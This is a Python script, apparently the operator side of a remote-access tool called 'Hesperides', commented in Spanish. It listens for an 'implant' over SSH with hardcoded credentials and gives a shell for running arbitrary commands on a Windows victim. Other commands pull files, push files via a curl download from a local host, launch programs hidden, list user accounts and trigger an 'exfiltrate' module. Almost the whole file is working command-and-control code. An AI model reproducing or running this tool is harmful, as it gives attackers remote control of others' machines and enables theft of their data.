

import paramiko
import os
import socket



print("""
      
      , 
      .@, 
     .@a@a,. 
     S@@ss@@@@a,. 
    sS@@@ss@@@@@Ss,  , 
 , SSSSS@@@ss@@@SSSs @, 
 @sSSSSSSSS@@ss@SSSSs@@s, , 
 `@@@@@SSSSSSSSssSSS@@@@@sSs, 
   @@@@@@@@@@@@@@ss@@@@@@@@SSs , 
 , `@@@@@@@@@@@@@@ss@@@@@@@SSSs@, 
  SsSSSS@@@@@@@@@@@ss@@@@@@SSSSS@, 
  `SSSSSSSSS@@@@@@@@@ss@@@@SSSSS@@ 
   `SSSSSSSSSSSS@@@@@@ss@@SSSSSS@@',''', 
   , `SSSSSSSSSSSSSSS@@ss@SSSSS@@@;%,.,,` 
    @aSSSSSSSSSSSSSSSSSSssSSSS@@@@;%;%%' 
     `@@@@@@@SSSSSSSSSSSSssSSS@@@@;%;%' 
        `@@@@@@@@@@@@@@@SSSssS@@@@;%;% 
           `@@@@@@@@@@@@@@@@@ss@@@;%;%    ...,,,,,,,,,,.. 
               `@@@@@@@@@@@@@@@ssS;%;%  .;;%%;%%;%%%;%%;%%%,. 
         .,::;;;;;;;;`SSSSSSSSSSSss;%%,::;%;%%%%%%%;%%%%%%;%%%%,. 
      .:::;;;;;%;;;;;;;,;;,;;,;;,::,.,::;%%%%%;%%%%%%%%%%%%%%%;%%%;, 
    .:::;;;%;;;;;%;%;%;%;%;%;%%%%;%%%%%;%%%%%%%%%%;%%%%%;%%%%%%%%;%%;. 
   :::;%;;;;%;;%;;;%;%;;%%%;%%%%%%%;%%%%%%%;%%%%%%%%%x%x%%%%%%%%;%%;%;, 
  :::;;;;;%;;%;;;%;;%;%%%%%%%%;%%%%%%%%%%%%%%%%%%%%%%%x%x%%%%%%%%%%%;%;, 
 :::;;;;;%;;;;;;%;%%;%xx%;%%%%%%%;%%%%%%%x%%%%%%%%%%%%%x%x%x%%%%%%%;%;%; 
,:::;%;;%;;;%;%;;%;%%x%;%%%%%%%%%%%%%x%x%%x%%%%%%%%%%%%%x%%x%x%%%%%%;%%;, 
:::;;;;%;;%;;%;;%%%;x%x%%%;%%%%%%%%%%%%%x%%x%%%%%%%%%%%xx%x%x%%%%%%%%;;%; 
:::%;;;;;%;;%;;%%;%%;%;%%%%%%%%%%%%;%%x%%x%%x%;%%%%%%%%%x%x%%%%%%%%%;%;%; 
:::;;;%;;;;%;%;%;%%;%%%%%%%;%%%%%%%%%%%x%%x%%%%%%%%%%%%x%x%%x%%%%%%;%;%%; 
`:::;;;;%;%;%;%;%%;%%;%%%%%%%%%%%%%%%%%%%x%x%%%%%%%%%%xx%x%%%%%%%%%;%;%;' 
 `:::;;%;%;;%;;%%;%%;%;%%;%%%%%;%%%%%%%%%%%%%%%%%%;%%%%x%%%%%%%%%;%%;%;' 
  `:::;;;;;%;;%%;%%;%%%%%%%;%%%%%%%%%%;%%%%%%%%;%%%%%;%%%%%%%%%;%%;%%;' 
   `:::;;%;;;%;;;%%%;%%;%%%%%%%%%%;%%%%%%%%%%;%%%%%%%%%%%%%%;%;%;%%%;' 
     `:::;;%;;;%%;%;%;%%;%;%%%%%%%%%%%%%%%%%%%%%%;%%;%%%%;%%%;%;%;%;' 
       `:::;;;%;;%;;%%;%;%%%%%%%%%%%%%%%%%%;%%%%%%%%%%%;%%%;%%;%%;' 
         `:::;;;%;;%;%;%%%%;%%%%%%;%%%%%%%%%%%%;%%%;%%;%%;%%;%%;' 
           `:::;;%;;%;;%;%%%%%%;%%%%%%%%%%%%;%%%%%%%%%%%;%;%%;' 
             `:::;%;;;%;;%;%x%%%%%;%%%%%%%%x%%%%%%;%%%;%%;%;' 
               `:::;;;%;%;;%;x%x%x%%x%;%x%x%%%%;%%%%%;%;%;' 
                 `:::%;%;;%:%:,xx%%x%%x%xx,:%%%%;%%;%%%;' 
                   `:::%;;;;:%:`xx%x%xx%x':%%%;%%%%%%;' 
                    `:::;;%;;%:,`%x%xx%x',:%;%%%%;%%;' 
                      `:::;;;;;:::'   `:::;;;;;;:::'

  _   _ _____ ____  ____  _____ ____  ___ ____  _____ ____  
 | | | | ____/ ___||  _ \| ____|  _ \|_ _|  _ \| ____/ ___| 
 | |_| |  _| \___ \| |_) |  _| | |_) || || | | |  _| \___ \ 
 |  _  | |___ ___) |  __/| |___|  _ < | || |_| | |___ ___) |
 |_| |_|_____|____/|_|   |_____|_| \_\___|____/|_____|____/ 
                                                            
        """)
class SSHServer(paramiko.ServerInterface):
    def check_channel_request(self, kind, chanid):
        #metodo de conexion basico
        if kind == "session":
            return paramiko.OPEN_SUCCEEDED
        #conexion fallida por defecto
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
    #aqui se puede meter encriptacion etc etc pero mejor hacerlo simple
    def check_auth_password(self, username, password):
        #aqui el usuario y pass que usaremos para el implant
        if (username == "sshuser") and (password == "sshpass"):
            #login correcto
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED        
def main():
    server = "0.0.0.0" #para escuchar por cualquier interfaz
    port = 2222
    #llaves ssh (generar una en ubuntu con sshkeygen)
    cwd = os.getcwd()
    #con esto añado el directorio en el que estoy + la clave id_rsa
    hostkey = paramiko.RSAKey(filename=os.path.join(cwd, "id_rsa"))
    #sockets
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #usamos el reuseaddr para usar el mismo puerto para varias cosas
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((server, port))
        sock.listen()
        print("Buscando conexiones:")
        client, addr = sock.accept()

    except KeyboardInterrupt:
        quit()
    ssh_session = paramiko.Transport(client)
    ssh_session.add_server_key(hostkey)
    server = SSHServer()
    ssh_session.start_server(server=server)
    chan = ssh_session.accept()
    if chan is None:
        print("Error de transporte o sesion")
        quit()
    print(chan) #para ver si que error saca
    success_msg = chan.recv(40960).decode()
    print(f"{success_msg}")
    chan.send(" ")
    def comm_handler():
        try:
            while True:
                cmd_line = ("Shell%>")
                command = input(cmd_line + "")
                #args = command.split()
                if command == "help":
                    print("""
Menu de Hesperides:
get_file: Lanzando el comando get_file seguido de un archivo ubicado en el directorio del cliente, se envia al servidor\n
send_file: Lanzando el comando send_file seguido de un archivo ubicado en el directorio del servidor, se envia al cliente\n
exec: Lanzando el comando exec seguido de un archivo ubicado en el directorio, se ejecuta dicho archivo\n
get_users: Lista los usuarios del sistema\n
exfiltrate: Lanza el modulo de recopilacion de informacion y copia el archivo info.txt en el directorio del servidor\n
                        """)
                    continue
                if command == "get_users":
                    command = ("wmic useraccount list brief")
                    chan.send(command)
                    #respuesta
                    ret_value = chan.recv(40960)
                    print(ret_value.decode())
                    continue
                #envio de archivo desde el cliente al servidor
                if command.split(" ")[0] == "get_file":
                    chan.send(command)
                    
                #envio de archivo desde el servidor al cliente
                if command.split(" ")[0] == "send_file":
                    archivo = command.split(" ")[1]
                    command = (f"curl -O http://192.168.0.13:8080/{archivo}")
                    chan.send(command)
                    #respuesta
                    ret_value = chan.recv(40960)
                    print(ret_value.decode())
                    
                #activacion del modulo de exfiltracion de informacion + subida
                if command == "exfiltrate":
                    chan.send(command)
                    
                #ejecucion de comandos de forma remota
                if command.split(" ")[0] == "exec":
                    ejecutable = command.split(" ")[1]
                    ejecucion = "start /MIN /B " + ejecutable
                    chan.send(ejecucion)
                    ret_value = chan.recv(40960)
                    print(ret_value.decode())
                    
                if command == "":
                    continue            
                else:
                        chan.send(command)
                        ret_value = chan.recv(40960)
                        print(ret_value.decode())
                        continue
        except Exception as e:
            print(str(e))
            pass
        except KeyboardInterrupt:
            quit()
    comm_handler()
if __name__ == "__main__":
    main()

